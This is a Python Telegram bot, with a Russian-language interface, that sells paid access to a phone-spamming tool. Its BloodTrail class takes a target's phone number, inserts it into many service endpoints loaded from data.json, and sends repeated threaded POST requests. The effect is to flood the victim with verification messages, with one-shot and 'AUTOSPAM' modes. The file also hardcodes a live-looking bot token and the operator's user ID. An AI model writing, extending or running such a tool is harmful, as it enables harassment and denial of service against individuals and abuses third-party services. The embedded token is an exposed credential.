import json
from threading import Thread
import requests
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters
import logging

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Your Telegram bot token
TOKEN = "7618261878:AAGyoMuFThdLwOMbcBIR9W9rqo2wq2abVlA"

# Your Telegram User ID (replace this with your actual Telegram user ID)
YOUR_USER_ID = 5252716406  # Replace with your actual user ID

# Load paid users from data.json
def load_paid_users():
    try:
        with open("data.json", "r", encoding="utf-8") as f:
            data = json.load(f)
            return data["paid_users"]["users"]
    except FileNotFoundError:
        return []

# Save paid users to data.json
def save_paid_users(user_id):
    try:
        with open("data.json", "r", encoding="utf-8") as f:
            data = json.load(f)

        if user_id not in data["paid_users"]["users"]:
            data["paid_users"]["users"].append(user_id)

        with open("data.json", "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except FileNotFoundError:
        data = {
            "paid_users": {
                "users": [user_id]
            }
        }
        with open("data.json", "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)

# Phone number validation function (for +7 and +77)
def is_valid_number(number):
    # Ensure number starts with +7 or +77 and is 12 digits long
    if number.startswith("+7") and len(number) == 12:
        return True
    elif number.startswith("+77") and len(number) == 12:
        return True
    return False

class BloodTrail:
    def __init__(self, number):
        self.stop_spam = False
        try:
            with open("data.json", "r", encoding="utf-8") as f:
                self.data = json.load(f)
            self.number = number
            self.data["last_used_number"] = self.number
            with open("data.json", "w", encoding="utf-8") as j:
                json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
        except FileNotFoundError:
            print(f"ERROR: data.json file not found.")
            sys.exit()

    def format_data(self):
        for service in self.data["services"]:
            for k, v in self.data["services"][service]["data"].items():
                if "%NUMBER%" in v:
                    v = v.replace("%NUMBER%", self.number[int(self.data["services"][service]["phone_f"]):])
                    self.data["services"][service]["data"][k] = v

    @staticmethod
    def post_request(service, url, data=None, json_data=None):
        if json_data:
            requests.post(url=url, json=json_data)
        else:
            requests.post(url=url, data=data)

    def start_threads(self, repeats=1):
        threads = []
        for i in range(repeats):
            if self.stop_spam:
                break
            for service in self.data["services"]:
                if self.stop_spam:
                    break
                data_type = self.data["services"][service]["data_type"]
                if data_type == "json":
                    t = Thread(target=self.post_request, args=(service,
                                                               self.data["services"][service]["url"],
                                                               None,
                                                               self.data["services"][service]["data"]))
                else:
                    t = Thread(target=self.post_request, args=(service,
                                                               self.data["services"][service]["url"],
                                                               self.data["services"][service]["data"],
                                                               None))
                threads.append(t)
                t.start()

        for thread in threads:
            thread.join()

    def stop(self):
        self.stop_spam = True

# Start command with SPAM and AUTOSPAM buttons
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    paid_users = load_paid_users()

    if user_id == YOUR_USER_ID or user_id in paid_users:
        # If the user is you or a paid user, show the options
        keyboard = [
            [InlineKeyboardButton("SPAM", callback_data='spam'), InlineKeyboardButton("AUTOSPAM", callback_data='autospam')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Добро пожаловать в Секретный бот! Выберите 'SPAM' или 'AUTOSPAM'.", reply_markup=reply_markup)
    else:
        # If the user is not authorized, show restricted access message
        await update.message.reply_text("Напишите его @muslimtm1, оно платное!")

# Handle SPAM button
async def spam_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Ask for phone number
    await query.edit_message_text("Введите номер, например: +77XXXXXXXXX")
    context.user_data['spam_state'] = 'waiting_for_number_spam'

# Handle AUTOSPAM button
async def autospam_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    # Ask for phone number
    await query.edit_message_text("Введите номер, например: +77XXXXXXXXX")
    context.user_data['spam_state'] = 'waiting_for_number_autospam'

# Handle user input for SPAM and AUTOSPAM
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'spam_state' in context.user_data:
        state = context.user_data['spam_state']
        if state == 'waiting_for_number_spam':
            phone_number = update.message.text
            if is_valid_number(phone_number):
                context.user_data['phone_number'] = phone_number
                await update.message.reply_text("Введите число на спам.")
                context.user_data['spam_state'] = 'waiting_for_repeats_spam'
            else:
                await update.message.reply_text("Пожалуйста, введите корректный номер телефона (например: +77012345678).")
        elif state == 'waiting_for_repeats_spam':
            try:
                repeats = int(update.message.text)
                phone_number = context.user_data['phone_number']
                context.user_data['spam_state'] = None

                # Run spam process
                bloodtrail = BloodTrail(phone_number)
                bloodtrail.format_data()
                bloodtrail.start_threads(repeats)

                await update.message.reply_text(f"Успешный спам завершён на номер {phone_number} за {repeats} раз!")
            except ValueError:
                await update.message.reply_text("Пожалуйста, введите корректное число.")
        elif state == 'waiting_for_number_autospam':
            phone_number = update.message.text
            if is_valid_number(phone_number):
                context.user_data['phone_number'] = phone_number
                await update.message.reply_text("Введите число на спам.")
                context.user_data['spam_state'] = 'waiting_for_repeats_autospam'
            else:
                await update.message.reply_text("Пожалуйста, введите корректный номер телефона (например: +77012345678).")
        elif state == 'waiting_for_repeats_autospam':
            try:
                repeats = int(update.message.text)
                phone_number = context.user_data['phone_number']
                context.user_data['spam_state'] = None

                # Show STOP button
                keyboard = [[InlineKeyboardButton("STOP", callback_data='stop')]]
                reply_markup = InlineKeyboardMarkup(keyboard)
                await update.message.reply_text(f"Успешный автоспам начат на номер {phone_number}!", reply_markup=reply_markup)

                # Run auto spam
                context.user_data['spam_instance'] = BloodTrail(phone_number)
                bloodtrail = context.user_data['spam_instance']
                bloodtrail.format_data()
                bloodtrail.start_threads(repeats)
            except ValueError:
                await update.message.reply_text("Пожалуйста, введите корректное число.")

# Handle STOP button
async def stop_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if 'spam_instance' in context.user_data:
        bloodtrail = context.user_data['spam_instance']
        bloodtrail.stop()
        await query.edit_message_text("Авто спам остановлен.")

# Main function to run the bot
def main():
    application = Application.builder().token(TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))

    # Callback query handlers
    application.add_handler(CallbackQueryHandler(spam_button, pattern='spam'))
    application.add_handler(CallbackQueryHandler(autospam_button, pattern='autospam'))
    application.add_handler(CallbackQueryHandler(stop_button, pattern='stop'))

    # Message handler for user input
    application.add_handler(MessageHandler(filters.TEXT, handle_message))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
